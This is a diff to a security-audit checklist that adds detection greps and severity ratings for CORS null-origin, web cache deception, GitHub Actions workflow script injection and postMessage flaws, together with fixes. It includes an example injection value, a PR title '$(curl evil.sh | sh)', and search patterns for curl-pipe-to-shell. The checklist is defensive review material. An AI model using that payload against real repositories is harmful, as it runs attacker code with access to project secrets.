@@ -30,6 +30,7 @@ rg -n -i "access-control-allow-origin|cors\(|allow_origins|origin.*\*"
 ```
 - `Access-Control-Allow-Origin: *` **combined with** `Allow-Credentials: true` → impossible per spec; if framework silently reflects origin instead → **CRITICAL** (any site reads authenticated data)
 - Origin reflection/echo of `Origin` header or regex like `https?://.*\.example.com` (matches `evilexample.com` — missing anchored dot) → HIGH
+- **`Origin: null` allowed** (sandboxed iframes/data URIs send it; `Access-Control-Allow-Origin: null` in config or allow-lists matching null) with credentials/JSON → HIGH — null origin is attacker-forgeable via sandboxed iframe
 - Wildcard without credentials → LOW/MEDIUM (still enumerates data)
 
 ## 4 — Debug & exposure
@@ -40,6 +41,7 @@ rg -n -i "traceback|stack.?trace|display_errors\s*=\s*on|show_exceptions"
 ```
 - Django `DEBUG=True` / Flask `debug=True` / Laravel `APP_DEBUG=true` in prod-looking config → HIGH (stack traces, env leaks, Werkzeug debugger = RCE)
 - Verbose error responses leaking SQL, paths, versions → MEDIUM
+- **Web cache deception**: authenticated responses without `Cache-Control: private`/`no-store` behind a cache keyed on path extension (`/api/me` vs `/api/me/x.css` served from cache) → session data cached and readable. Check auth'd endpoints' cache headers + cache rules that vary on file extension.
 - Default creds in configs (`admin/admin`, `postgres/postgres` in docker-compose) → HIGH in prod context, LOW in clearly-local compose
 - Exposed sensitive files: `.git/` served, `.env` in webroot, `*.bak`, `.DS_Store`, `dump.sql`, `phpinfo()` pages → HIGH
 - Admin/health/debug endpoints (`/actuator/*` with env/heapdump, `/debug`, `/admin`) without auth → CRITICAL (Spring env/heapdump leaks credentials)
@@ -48,8 +50,10 @@ rg -n -i "traceback|stack.?trace|display_errors\s*=\s*on|show_exceptions"
 
 ```bash
 rg -n "pull_request_target|secrets\.|curl.*\|\s*(ba)?sh|sudo|GITHUB_TOKEN|persist-credentials" .github/workflows/ 2>/dev/null
+rg -n "\$\{\{\s*github\.event\.(pull_request\.(title|body|head\.ref)|comment\.|issue\.|review\.)" .github/workflows/ 2>/dev/null
 ```
 - `pull_request_target` + checkout of PR head + secrets usage → **CRITICAL** (fork PRs run with base repo secrets)
+- **Workflow script injection**: `${{ github.event.pull_request.title }}` (or body/comment/review text) interpolated directly inside a `run:` block → attacker pushes a PR titled `$(curl evil.sh | sh)` → **Critical**. Pass event data through `env:` first (`TITLE: ${{ github.event.pull_request.title }}` then `"$TITLE"` — shell-quoted).
 - `curl ... | bash` in workflows/Dockerfiles → HIGH
 - Secrets echoed in logs (`echo $SECRET`), or secrets in `env:` at job level where third-party actions run → MEDIUM/HIGH
 - Third-party actions pinned by tag (`uses: x/y@v1`) instead of commit SHA → MEDIUM
@@ -62,6 +66,20 @@ rg -n "pull_request_target|secrets\.|curl.*\|\s*(ba)?sh|sudo|GITHUB_TOKEN|persis
 - Django: `ALLOWED_HOSTS: ['*']` → MEDIUM; `CSRF_COOKIE_SECURE`, `SESSION_COOKIE_SECURE` false → MEDIUM
 - Rails: `force_ssl` off, `config.hosts` empty
 - Spring: `management.endpoints.web.exposure.include: "*"` → HIGH
+
+## 7 — Client-side: postMessage & friends
+
+```bash
+rg -n "addEventListener\(\s*['\"]message|onmessage\s*=|\.receive\(|window\.postMessage|\.postMessage\(" -g '*.js' -g '*.ts' -g '*.html' -g '*.vue' -g '*.svelte'
+```
+
+SPA/extension/embed code that listens for messages:
+- **No `event.origin` check** before using `event.data` → HIGH (any window/embed can message it)
+- `event.data` flowing into DOM sinks (`innerHTML`, `location.href = e.data`) → **CRITICAL** combo (cross-origin XSS)
+- Sending with `postMessage(payload, '*')` when payload is sensitive → MEDIUM (any parent/iframe receives it)
+- Safe form: `if (e.origin !== 'https://app.example.com') return;` + escaped sinks + explicit target origin
+
+Also: `window.open` handles with `opener` access across origins, and service-worker `message` handlers — same rules.
 
 ## Reporting
 
